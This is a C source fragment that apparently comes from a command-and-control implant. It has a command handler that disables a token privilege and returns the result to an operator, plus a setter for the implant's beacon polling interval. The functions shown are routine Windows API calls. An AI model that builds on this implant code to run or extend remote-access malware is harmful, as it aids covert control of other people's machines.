DWORD DisableCurrentTokenPrivilege(
	PCWSTR privilegeName,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	LUID luid = { 0 };
	TOKEN_PRIVILEGES tp = { 0 };
	DWORD status = NO_ERROR;
	PBYTE finalBuffer = NULL;
	DWORD finalLength = 0;
	DWORD nameBytes = 0;
	HANDLE tokenHandle = NULL;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	if (!OpenProcessToken(
		GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
		&tokenHandle))
	{
		status = ERROR_OPEN_PROCESS_TOKEN_FAILED;
		goto cleanup;
	}

	if (!LookupPrivilegeValueW(NULL, privilegeName, &luid))
	{
		status = ERROR_LOOKUP_PRIVILEGE_VALUE_FAILED;
		goto cleanup;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = 0; // 0 = disabled

	if (!AdjustTokenPrivileges(
		tokenHandle,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		NULL,
		NULL))
	{
		status = ERROR_ADJUST_TOKEN_PRIVILEGES_FAILED;
		goto cleanup;
	}

	nameBytes = (DWORD)((wcslen(privilegeName) + 1) * sizeof(WCHAR));
	finalLength = sizeof(DWORD) + nameBytes;

	finalBuffer = (PBYTE)ImplantHeapAlloc(finalLength);
	if (finalBuffer == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	*(DWORD*)finalBuffer = status;
	CopyMemory(finalBuffer + sizeof(DWORD), privilegeName, nameBytes);

	*responseData = finalBuffer;
	*responseLen = finalLength;
	finalBuffer = NULL;

cleanup:
	if (tokenHandle != NULL)
	{
		CloseHandle(tokenHandle);
	}
	if (finalBuffer != NULL)
	{
		ImplantHeapFree(finalBuffer);
	}

	return status;
}

// g_PollIntervalMs is declared volatile in exports.c and read by the polling loop
// CmdSleep calls this to update the interval without touching exports.c directly
extern volatile DWORD g_PollIntervalMs;

VOID SetPollInterval(DWORD intervalMs)
{
	g_PollIntervalMs = intervalMs;
}
